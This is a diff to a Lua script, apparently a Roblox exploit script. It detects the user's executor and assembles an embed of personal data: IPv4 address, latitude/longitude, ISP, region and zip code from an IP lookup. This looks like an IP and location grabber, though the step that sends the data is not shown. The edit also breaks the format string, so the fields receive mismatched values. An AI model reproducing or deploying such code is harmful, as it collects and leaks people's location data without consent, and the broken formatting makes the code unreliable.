@@ -2,7 +2,7 @@ do
     -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
     local function checkExploit()
         
-        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')
+        local exploitName = (syn and 'Synapse X') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')
 
         exploitName = exploitName or 'I don\'t fucking know'
 
@@ -50,7 +50,7 @@ do
                             },
                             {
                             ["name"] = "Personal",
-                            ["value"] = string.format("*IPV4: ||%s||*\n*Lat/Lon: %s/%s*\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["value"] = string.format("*IPV4: ||%s||\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
